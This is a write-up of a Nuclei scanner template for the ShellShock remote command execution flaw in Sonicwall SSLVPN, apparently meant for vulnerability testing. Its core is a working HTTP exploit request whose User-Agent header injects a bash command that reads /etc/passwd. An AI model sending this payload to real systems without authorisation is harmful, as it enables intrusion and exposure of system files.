# Nuclei Template: Sonicwall SSLVPN - Remote Code Execution (ShellShock)
**Template ID:** sonicwall-sslvpn-shellshock
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`sonicwall-sslvpn-shellshock.yaml`)

## Vulnerability Information & PoC

## Description
Sonicwall SSLVPN contains a 'ShellShock' vulnerability which allows remote unauthenticated attackers to execute arbitrary commands.

## Steps to reproduce / Exploit Payload
```http
GET /cgi-bin/jarrewrite.sh HTTP/1.1
Host: {{Hostname}}
User-Agent: "() { :; }; echo ; /bin/bash -c 'cat /etc/passwd'"
Accept: */*
```

## References
- https://twitter.com/chybeta/status/1353974652540882944
- https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/
